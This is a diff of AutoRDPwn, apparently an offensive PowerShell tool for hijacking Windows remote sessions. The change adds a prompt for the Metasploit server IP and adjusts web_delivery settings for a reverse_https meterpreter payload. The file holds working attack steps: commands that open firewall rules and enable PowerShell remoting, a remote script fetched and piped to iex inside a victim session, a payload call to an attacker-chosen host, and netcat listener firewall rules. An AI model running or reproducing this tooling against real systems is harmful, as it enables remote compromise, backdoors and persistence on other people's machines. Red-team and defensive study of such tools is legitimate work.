@@ -148,6 +148,7 @@ if($Language -in 'English') {
   $txt62 = "Remote VNC Server (legacy)"
   $txt63 = "Paste in your Metasploit Framework Console:` "
   $txt64 = "Backdoors and persistence"
+  $txt65 = "Enter the IP where MSF is running:` "
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
@@ -220,6 +221,7 @@ if($Language -in 'Spanish') {
   $txt62 = "Servidor VNC Remoto (legacy)"
   $txt63 = "Pega esto en tu consola de Metasploit Framework:` "
   $txt64 = "Backdoors y persistencia"
+  $txt65 = "Introduce la IP dónde se está ejecutando MSF:` "
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; netsh advfirewall firewall set rule group='Escritorio Remoto' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
@@ -392,11 +394,11 @@ if($Language -in 'Spanish') {
 
         if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
 	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
-	Write-host "$txt54" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
+	Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
-	Write-host "set SRVHOST 0.0.0.0" ; Write-host "set SRVPORT 4433" ; Write-host "set SSL true" ; Write-host "set target 2"
-        Write-host "set payload windows/x64/meterpreter/reverse_https" ; Write-host "set LHOST 0.0.0.0"
-	Write-host "set LPORT 443" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j"
+	Write-host "set SRVHOST 0.0.0.0" ; Write-host "set SRVPORT 433" ; Write-host "set SSL true" ; Write-host "set target 2"
+        Write-host "set payload windows/meterpreter/reverse_https" ; Write-host "set LHOST 0.0.0.0"
+	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j"
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
@@ -641,8 +643,8 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/mas
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1" -UseBasicParsing | iex 
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload -url https://$metaserver/$metarandom -verbose ; sleep -milliseconds 7500
-Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host }}
+Invoke-MetasploitPayload -url https://$metaserver/$metarandom -verbose
+Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; sleep -milliseconds 7500 }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
